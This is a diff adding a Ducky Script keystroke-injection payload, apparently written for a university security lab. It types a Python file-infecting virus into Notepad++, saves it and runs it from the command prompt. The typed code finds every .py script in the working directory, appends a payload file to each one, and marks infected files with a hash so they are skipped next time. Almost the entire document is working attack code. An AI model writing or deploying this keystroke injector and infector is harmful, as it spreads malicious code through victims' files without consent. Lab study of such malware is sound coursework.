@@ -1,0 +1,227 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING notepad++
+ENTER
+DELAY 1000
+REM Write the Python code line by line, resetting indentation each time
+STRING from Parasite import Parasite
+ENTER
+CTRL LEFT
+STRING Parasite(output_path="Q1C.out", payload_file="Q1_payload.py").inject_all()
+ENTER
+CTRL LEFT
+STRING E = False
+ENTER
+CTRL LEFT
+STRING D = FileNotFoundError
+ENTER
+CTRL LEFT
+STRING C = None
+ENTER
+CTRL LEFT
+STRING B = print
+ENTER
+CTRL LEFT
+STRING import os
+ENTER
+CTRL LEFT
+STRING from FileOperations import FileOperations as A
+ENTER
+CTRL LEFT
+STRING class F:
+ENTER
+CTRL LEFT
+STRING     def __init__(self, file):
+ENTER
+CTRL LEFT
+STRING         self.file = file
+ENTER
+CTRL LEFT
+STRING     def is_script(self):
+ENTER
+CTRL LEFT
+STRING         try:
+ENTER
+CTRL LEFT
+STRING             F = 'if __name__ == "__main__":'
+ENTER
+CTRL LEFT
+STRING             if F in A.read(self.file):
+ENTER
+CTRL LEFT
+STRING                 return True
+ENTER
+CTRL LEFT
+STRING             B(f"Could not verify file {self.file} is a Python script; no {F} statement.")
+ENTER
+CTRL LEFT
+STRING             return E
+ENTER
+CTRL LEFT
+STRING         except D:
+ENTER
+CTRL LEFT
+STRING             raise D(f"File {self.file} not found.")
+ENTER
+CTRL LEFT
+STRING     def is_infected(self):
+ENTER
+CTRL LEFT
+STRING         id = '# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7d'
+ENTER
+CTRL LEFT
+STRING         try:
+ENTER
+CTRL LEFT
+STRING             if id in A.read(self.file):
+ENTER
+CTRL LEFT
+STRING                 B(f"File {self.file} is already infected.")
+ENTER
+CTRL LEFT
+STRING                 return True
+ENTER
+CTRL LEFT
+STRING             return E
+ENTER
+CTRL LEFT
+STRING         except D:
+ENTER
+CTRL LEFT
+STRING             raise D(f"File {self.file} not found.")
+ENTER
+CTRL LEFT
+STRING     def is_verified(self):
+ENTER
+CTRL LEFT
+STRING         if self.is_script() and not self.is_infected():
+ENTER
+CTRL LEFT
+STRING             return 1
+ENTER
+CTRL LEFT
+STRING         B(f"Verification of {self.file} failed.\\nQuitting...")
+ENTER
+CTRL LEFT
+STRING         return 0
+ENTER
+CTRL LEFT
+STRING class G:
+ENTER
+CTRL LEFT
+STRING     def __init__(self, target_file=C, payload_file=C, output_path=C):
+ENTER
+CTRL LEFT
+STRING         self.target_file = target_file
+ENTER
+CTRL LEFT
+STRING         self.payload_file = payload_file
+ENTER
+CTRL LEFT
+STRING         self.output_path = output_path
+ENTER
+CTRL LEFT
+STRING         A.clear(self.output_path)
+ENTER
+CTRL LEFT
+STRING     def getPyFiles(self):
+ENTER
+CTRL LEFT
+STRING         D = os.getcwd()
+ENTER
+CTRL LEFT
+STRING         for (F, dir, E) in os.walk(D):
+ENTER
+CTRL LEFT
+STRING             for B in E:
+ENTER
+CTRL LEFT
+STRING                 if B.endswith('.py'):
+ENTER
+CTRL LEFT
+STRING                     A.append_to(self.output_path, f"{B}\\n")
+ENTER
+CTRL LEFT
+STRING     def inject(self, file=C):
+ENTER
+CTRL LEFT
+STRING         D = file
+ENTER
+CTRL LEFT
+STRING         if D is C:
+ENTER
+CTRL LEFT
+STRING             D = self.target_file
+ENTER
+CTRL LEFT
+STRING         G = F(D).is_verified()
+ENTER
+CTRL LEFT
+STRING         if not G:
+ENTER
+CTRL LEFT
+STRING             return 1
+ENTER
+CTRL LEFT
+STRING         B(f"Injecting {D}...\\n")
+ENTER
+CTRL LEFT
+STRING         A.append_to(D, f"\\n# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7d\\n{A.read(self.payload_file)}")
+ENTER
+CTRL LEFT
+STRING         return 0
+ENTER
+CTRL LEFT
+STRING     def inject_all(self):
+ENTER
+CTRL LEFT
+STRING         self.getPyFiles()
+ENTER
+CTRL LEFT
+STRING         E = A.read(self.output_path).split('\\n')
+ENTER
+CTRL LEFT
+STRING         E.pop()
+ENTER
+CTRL LEFT
+STRING         B(E)
+ENTER
+CTRL LEFT
+STRING         for C in E:
+ENTER
+CTRL LEFT
+STRING             B(C)
+ENTER
+CTRL LEFT
+STRING             if C != 'Parasite.py':
+ENTER
+CTRL LEFT
+STRING                 F = self.inject(C)
+ENTER
+CTRL LEFT
+STRING                 if F == 0:
+ENTER
+CTRL LEFT
+STRING                     B(f"{C} infected.")
+ENTER
+CTRL LEFT
+STRING G(output_path='Q1C.out', payload_file='Q1_payload.py').inject_all()
+ENTER
+REM Save the file
+CTRL s
+DELAY 300
+STRING "C:\Users\tjn43\OneDrive\Documents\UCONN Work\sophomore2\CSE-3140\lab2\Q5.py"
+ENTER
+DELAY 500
+REM Close Notepad++
+CTRL w
+DELAY 500
+REM Open Command Prompt and run the script
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 500
+STRING py "C:\Users\tjn43\OneDrive\Documents\UCONN Work\sophomore2\CSE-3140\lab2\Q5.py"
+ENTER
